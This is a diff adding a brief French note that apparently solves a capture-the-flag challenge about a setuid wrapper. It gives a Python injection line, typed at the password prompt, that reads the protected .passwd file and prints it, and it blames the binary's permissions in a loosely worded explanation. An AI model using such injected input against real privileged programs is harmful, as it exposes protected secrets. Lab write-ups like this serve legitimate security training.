@@ -1,0 +1,8 @@
+@challenge02:~$ ./setuid-wrapper 
+Entrer un mot de passe : 
+
+#SOLUTION A TAPER : sys.stdout.write(open(".passwd").readline())
+
+Permet d'ecrire sur le sortie standard la ligne lu dans le fichier .passwd 
+Car le fichier setuid a les permissions d'écriture . (-rwsr-x--- 1 app-script-ch6-cracked app-script-ch6 7260 déc.  10 14:12 setuid-wrapper)
+
